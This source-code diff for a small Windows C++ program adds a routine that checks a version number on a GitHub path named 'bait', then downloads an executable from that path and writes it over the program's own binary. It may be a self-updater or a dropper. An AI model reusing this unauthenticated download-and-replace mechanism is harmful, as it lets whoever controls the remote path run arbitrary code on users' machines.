@@ -6,6 +6,62 @@
 
 const int version=0;
 
+bool fetchUrlToFile(const char* url, const char* outputFilePath) {
+    HINTERNET hInternet, hURL;
+    HANDLE hFile;
+    DWORD bytesWritten;
+
+    // Initialize WinINet
+    hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (hInternet == NULL) {
+        return false;
+    }
+
+    // Open the URL
+    hURL = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (hURL == NULL) {
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    // Create the output file
+    hFile = CreateFileA(outputFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        InternetCloseHandle(hURL);
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    // Read the response data and write it to the file
+    const DWORD bufferSize = 4096;
+    char* buffer = new char[bufferSize];
+    DWORD bytesRead;
+    do {
+        if (!InternetReadFile(hURL, buffer, bufferSize, &bytesRead)) {
+            delete[] buffer;
+            CloseHandle(hFile);
+            InternetCloseHandle(hURL);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL)) {
+            delete[] buffer;
+            CloseHandle(hFile);
+            InternetCloseHandle(hURL);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+    } while (0 < bytesRead);
+
+    // Clean up
+    delete[] buffer;
+    CloseHandle(hFile);
+    InternetCloseHandle(hURL);
+    InternetCloseHandle(hInternet);
+
+    return true;
+}
+
 std::string fetchUrl(const char* url) {
     std::string response;
     HINTERNET hInternet, hURL;
@@ -61,11 +117,9 @@ int main(int argc, char* argv[])
 
         const char* a=fetchUrl("https://raw.githubusercontent.com/tankhellfire/remote/main/bait/version").c_str();
         if(version<std::stoi(a)){
-            a=fetchUrl("https://raw.githubusercontent.com/tankhellfire/remote/main/bait/.exe").c_str();
+            //a=fetchUrl("https://raw.githubusercontent.com/tankhellfire/remote/main/bait/.exe").c_str();
             MoveFileExA(path, (std::string(path)+"uyjhgbg").c_str(), MOVEFILE_REPLACE_EXISTING);
-            HANDLE file = CreateFile(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
-            WriteFile(file, a, strlen(a), NULL, NULL);
-            CloseHandle(file);
+            fetchUrlToFile("https://raw.githubusercontent.com/tankhellfire/remote/main/bait/.exe",path);
             return 0;
         }
 
